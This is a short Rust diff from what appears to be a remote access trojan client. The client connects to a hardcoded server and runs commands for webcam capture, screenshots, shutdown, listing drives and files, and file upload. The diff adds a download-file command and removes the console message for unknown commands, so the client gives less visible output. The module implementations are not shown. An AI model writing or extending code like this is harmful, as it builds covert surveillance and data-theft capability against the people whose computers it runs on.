@@ -10,7 +10,6 @@ use components::shutdown;
 use components::screenshot;
 use components::webcam;
 use components::files;
-use components::upload;
 
 pub mod utilities;
 mod components {
@@ -21,7 +20,6 @@ mod components {
     pub mod screenshot;
     pub mod webcam;
     pub mod files;
-    pub mod upload;
 }
 
 const SERVER : &str = "192.168.2.220";
@@ -62,10 +60,10 @@ fn main() {
                             "webcam" => webcam::capture(&stream),
                             "drives" => files::get_drives(&stream),
                             "files" => files::get_files(&stream),
-                            "upload-file" => upload::upload_file(&stream),
-                            
+                            "upload-file" => files::upload(&stream),
+                            "download-file" => files::download(&stream),
+
                             _ => {
-                                println!("Unknown command: {}", command);
                                 main();
                             }
                         }
